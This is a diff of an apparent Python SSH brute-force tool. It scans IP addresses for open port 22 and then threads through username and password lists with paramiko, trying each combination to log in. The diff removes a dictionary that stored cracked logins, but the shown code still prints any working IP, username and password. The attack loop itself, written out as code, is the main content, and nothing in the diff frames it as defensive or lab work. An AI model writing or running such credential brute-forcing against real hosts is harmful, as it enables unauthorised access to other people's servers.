@@ -10,9 +10,6 @@ scanned=[]
 ipInfo=[]
 found=[False,'22']
 
-#Dictionary the holds all of the found logins
-foundLogin={}
-
 #These turn the text files passwords.txt and usernames.txt into lists
 usernames=[line.strip() for line in open('usernames.txt').readlines()]
 passwords=[line.strip() for line in open('passwords.txt').readlines()]
@@ -52,7 +49,6 @@ def portScan(start,end,step):
 #This is the brute forcing function that runs after all the ip addresses with ssh open are found
 #This uses the passwords and usernames list made in the begining of the program
 #It will try to login to the ip address through ssh using a combination of a username and password from the lists
-#If a correct username and password combination is found it will print it to the screen and put it into the dictionary
 #The found variable is used to kill the threads when a working username and password combination is found
 #This part takes the longest in the whole program. About 2 minutes and 30 seconds for each ip address
 def bruteforce(start,end,step):
@@ -69,9 +65,6 @@ def bruteforce(start,end,step):
                         ssh.connect(isOpen[z],port=22,username=usernames[x],password=passwords[y])
                         ssh.close()
                         print(isOpen[z],usernames[x],passwords[y])
-                        foundLogin['IP']=isOpen[z]
-                        foundLogin['Username']=usernames[x]
-                        foundLogin['Password']=passwords[y]
                         found[0]=True
                         found[1]=str(z)
                     except:
